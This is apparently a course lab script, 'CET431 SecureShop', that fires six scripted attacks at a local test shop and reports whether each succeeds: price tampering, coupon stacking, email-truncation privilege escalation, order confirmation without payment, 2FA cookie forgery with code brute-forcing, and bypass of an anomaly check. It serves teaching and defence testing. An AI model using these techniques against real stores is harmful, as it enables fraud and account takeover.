"""
Attack Evidence script for CET431 SecureShop.

Runs the Lab 1-5 attacks against a running server and prints PASS/FAIL for
each. Point it at:
  - the naive build (SECURE_MODE=0)  -> every attack should SUCCEED
  - the secure build (SECURE_MODE=1) -> every attack should FAIL

Usage:
    python3 attacks/run_all.py http://127.0.0.1:5000

Each function returns (succeeded: bool, evidence: str) and is self-contained
(fresh session per test) so results don't depend on run order.
"""
import json
import re
import sys
import time

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"


def new_session():
    s = requests.Session()
    s.headers["User-Agent"] = "CET431-attack-script/1.0"
    return s


def get_confirm_link(s, to_contains):
    # mailbox.html lists newest mail FIRST (ORDER BY id DESC), so the first
    # match in the page is the most recent confirmation link.
    r = s.get(f"{BASE}/dev/mailbox")
    m = re.findall(r"/confirm/[\w\-]+", r.text)
    return m[0] if m else None


def get_otp(s, hint=None):
    # Same ordering note: newest OTP is the first match.
    r = s.get(f"{BASE}/dev/mailbox")
    codes = re.findall(r"verification code is:\s*(\d+)", r.text)
    return codes[0] if codes else None


# --------------------------------------------------------------------
# T1 - excessive trust in client-side price
# --------------------------------------------------------------------
def attack_t1_price_tamper():
    s = new_session()
    s.post(f"{BASE}/login", data={"username": "alice", "password": "Alice#2026pass",
                                  "rhythm": "[]"})
    # product 6 = Premium Leather Jacket, $1337.00, store credit is only $100
    s.post(f"{BASE}/cart/add", data={"productId": 6, "quantity": 1, "price": 1})
    cart = s.get(f"{BASE}/cart").text
    r = s.post(f"{BASE}/checkout", allow_redirects=False)
    loc = r.headers.get("Location", "")
    bought = r.status_code == 302 and ("/orders/" in loc or "order-confirmation" in loc)
    evidence = f"POST /cart/add price=1 -> cart shows {'0.01' in cart}; checkout -> {r.status_code} {loc}"
    return bought, evidence


# --------------------------------------------------------------------
# T2 - coupon stacking (A,B,A,B,...)
# --------------------------------------------------------------------
def attack_t2_coupon_stacking():
    s = new_session()
    s.post(f"{BASE}/login", data={"username": "alice", "password": "Alice#2026pass",
                                  "rhythm": "[]"})
    s.post(f"{BASE}/cart/add", data={"productId": 6, "quantity": 1})  # naive: price not sent -> real price used here
    codes = ["NEWCUST5", "SIGNUP30"]
    applied = 0
    for i in range(16):
        r = s.post(f"{BASE}/cart/coupon", data={"code": codes[i % 2]})
        if "already applied" not in r.text:
            applied += 1
    final = s.get(f"{BASE}/cart").text
    pct_match = re.search(r"Discount \((\d+)%\)", final)
    pct = int(pct_match.group(1)) if pct_match else 0
    r = s.post(f"{BASE}/checkout", allow_redirects=False)
    loc = r.headers.get("Location", "")
    bought = r.status_code == 302 and ("/orders/" in loc or "order-confirmation" in loc)
    return (pct > 35 and bought), f"applied {applied} coupon submissions, final discount {pct}%, checkout -> {r.status_code} {loc}"


# --------------------------------------------------------------------
# T3 - exceptional input: long email truncated to admin domain
# --------------------------------------------------------------------
def attack_t3_email_truncation():
    s = new_session()
    local = "a" * (255 - len("@dontwannacry.com"))
    email = local + "@dontwannacry.com.attacker.example"  # >255 chars total, truncates to end in @dontwannacry.com
    # mimic the lab: craft so char 255 is exactly the 'm' of @dontwannacry.com
    target_suffix = "@secureshop.com"
    local = "a" * (255 - len(target_suffix))
    email = local + target_suffix + ".evil.example"       # full address is NOT a secureshop.com address
    uname = "evil" + str(int(time.time()))
    s.post(f"{BASE}/register", data={"username": uname, "email": email, "password": "Password#123"})
    link = get_confirm_link(s, email)
    if link:
        s.get(f"{BASE}{link}")
    r = s.post(f"{BASE}/login", data={"username": uname, "password": "Password#123", "rhythm": "[]"})
    if "/login2" in r.url:
        # Our new account was granted the 'admin' role by the email-domain bug,
        # so it also goes through the (separately vulnerable/secure) second
        # factor. Complete it using the code from our own inbox so this test
        # isolates T3 (privilege escalation) from T5 (2FA).
        code = get_otp(s)
        s.post(f"{BASE}/login2", data={"mfa-code": code})
    r = s.get(f"{BASE}/admin")
    # requests follows the redirect to /login for a non-admin, so a bare
    # status 200 is not proof of access -- check we actually landed on the
    # admin page and not the login form.
    got_admin = r.status_code == 200 and "Admin panel" in r.text
    return got_admin, f"registered {len(email)}-char email -> final page is admin panel: {got_admin} (status {r.status_code})"


# --------------------------------------------------------------------
# T4 - insufficient workflow validation (confirm without paying)
# --------------------------------------------------------------------
def attack_t4_skip_payment():
    s = new_session()
    s.post(f"{BASE}/login", data={"username": "alice", "password": "Alice#2026pass",
                                  "rhythm": "[]"})
    before = s.get(f"{BASE}/account").text
    credit_before = re.search(r"Credit:\s*\$([\d,.]+)", before)
    s.post(f"{BASE}/cart/add", data={"productId": 6, "quantity": 1})  # jacket, way above credit
    r = s.get(f"{BASE}/order-confirmation?order-confirmation=true")
    order_created = "/orders/" in (r.headers.get("Location") or "") or r.status_code == 200
    after = s.get(f"{BASE}/account").text
    credit_after = re.search(r"Credit:\s*\$([\d,.]+)", after)
    unchanged = credit_before and credit_after and credit_before.group(1) == credit_after.group(1)
    return (order_created and unchanged), f"GET order-confirmation -> {r.status_code} {r.headers.get('Location')}, credit before={credit_before and credit_before.group(1)} after={credit_after and credit_after.group(1)}"


# --------------------------------------------------------------------
# T5 - broken 2FA: identity hijack via the "verify" cookie + brute force.
# Mirrors Lab 3.1 exactly: the attacker NEVER knows the admin's password.
# They only need their own (unrelated) login plus a tampered cookie.
# --------------------------------------------------------------------
def attack_t5_2fa_cookie_bruteforce():
    s = new_session()
    # Step 1: the attacker only authenticates as themselves (alice), which in
    # the naive build never touches the 'verify' cookie at all.
    s.post(f"{BASE}/login", data={"username": "alice", "password": "Alice#2026pass",
                                  "rhythm": "[]"})
    # Step 2: forge the cookie to point the second factor at the admin account.
    s.cookies.set("verify", "admin")
    r = s.get(f"{BASE}/login2", allow_redirects=False)
    if r.status_code == 302 and "/login2" not in r.headers.get("Location", ""):
        # secure build: no pending second factor for this session -> bounced to /login
        return False, f"GET /login2 with forged cookie -> {r.status_code} {r.headers.get('Location')} (no OTP issued)"
    # naive build: a fresh 4-digit code now exists for 'admin', brute-force it blind
    for guess in (f"{n:04d}" for n in range(10000)):
        rr = s.post(f"{BASE}/login2", data={"mfa-code": guess}, allow_redirects=False)
        if rr.status_code == 302 and "/login2" not in rr.headers.get("Location", ""):
            break
    else:
        return False, "brute force exhausted 10000 codes without success"
    r2 = s.get(f"{BASE}/admin")
    logged_in_admin = r2.status_code == 200 and "Admin panel" in r2.text
    return logged_in_admin, f"logged in as alice, forged verify=admin cookie, brute-forced code {guess} -> admin access: {logged_in_admin}"


# --------------------------------------------------------------------
# T6 - behavioural anomaly bypass (paste password, no rhythm)
# --------------------------------------------------------------------
def attack_t6_anomaly_bypass():
    # Build a profile of 5 "normal" logins for a fresh user, then log in once
    # with no typing rhythm at all (as a script/paste would) and see if it's
    # still allowed straight through (no step-up).
    s = new_session()
    uname = "typist" + str(int(time.time()))
    email = uname + "@example.com"
    s.post(f"{BASE}/register", data={"username": uname, "email": email, "password": "Password#123"})
    link = get_confirm_link(s, email)
    if link:
        s.get(f"{BASE}{link}")
    human_gaps = json.dumps([120, 95, 130, 110, 105, 140, 100])
    for _ in range(5):
        s.post(f"{BASE}/login", data={"username": uname, "password": "Password#123",
                                      "rhythm": human_gaps})
        s.post(f"{BASE}/logout")
    # Now log in with NO rhythm data at all (simulated paste / scripted login)
    r = s.post(f"{BASE}/login", data={"username": uname, "password": "Password#123"},
              allow_redirects=False)
    direct_in = r.status_code == 302 and r.headers.get("Location", "").rstrip("/").endswith(("/", ""))
    direct_in = r.status_code == 302 and "login2" not in r.headers.get("Location", "")
    r2 = s.get(f"{BASE}/account")
    logged_in_no_check = direct_in and r2.status_code == 200
    return logged_in_no_check, f"after 5 enrolled human logins, a no-rhythm login -> {r.status_code} {r.headers.get('Location')}"


def run(mode_label):
    tests = [
        ("T1 price tamper (client-side trust)", attack_t1_price_tamper),
        ("T2 coupon stacking (A,B,A,B...)", attack_t2_coupon_stacking),
        ("T3 email truncation -> admin", attack_t3_email_truncation),
        ("T4 confirm order without paying", attack_t4_skip_payment),
        ("T5 2FA cookie hijack + brute force", attack_t5_2fa_cookie_bruteforce),
        ("T6 anomaly check bypass (paste)", attack_t6_anomaly_bypass),
    ]
    print(f"\n=== Attack run against {BASE} ({mode_label}) ===")
    for name, fn in tests:
        try:
            ok, evidence = fn()
        except Exception as e:
            ok, evidence = False, f"error: {e}"
        tag = "ATTACK SUCCEEDED" if ok else "attack failed (defended)"
        print(f"[{tag:24s}] {name}\n    evidence: {evidence}")


if __name__ == "__main__":
    run(sys.argv[2] if len(sys.argv) > 2 else "?")
